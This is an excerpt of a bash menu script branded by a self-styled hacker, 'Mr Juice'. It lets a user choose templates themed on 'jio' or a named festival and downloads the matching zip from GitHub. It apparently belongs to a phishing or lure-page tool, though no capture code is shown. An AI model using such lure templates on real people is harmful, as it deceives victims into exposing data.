...
# Author     : Mr Juice 
# Instagm    : https://instagram.com/mr_juice7
# Telegram   : http://t.me/HackersBot_2022bot
# Date       : 20-09-2022
...
trap "echo -e '\n${success}Thanks for Using! Visit Site : https://bio.link/mrjuice\n'; exit" 2
...
sleep 1
printf "${cyan}\nMrJuice${nc}@${blue}Mr.Juice ${red}$ ${nc}"
read option
# Select template
    if echo $option | grep -q "1"; then
        dir="jio"
        ...
        dir="fest"
        printf "\n${ask}Enter festival name:${cyan}\n\nMrJuice${nc}@${blue}MrJuice ${red}$ ${nc}"
        read fest_name
        if [ -z $fest_name ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 1
...
$red[Author]     ${cyan} :[Mr Juice]
$red[Instagrm]    ${cyan} :[https://instagram.com/mr_juice7] 
$red[Website]    ${cyan} :[https://bio.link/mrjuice]
$red[Telegram]   ${cyan} :[http://t.me/HackersBot_2022bot]"
printf "${cyan}\nMrJuice${nc}@${cyan}MrJuice ${red}$ ${nc}"
read about
    elif echo $option | grep -q "m"; then
        xdg-open "https://bio.link/mrjuice "
...
cd $dir
netcheck
wget -q --show-progress "https://github.com/MrJuice/files/raw/main/${dir}.zip"
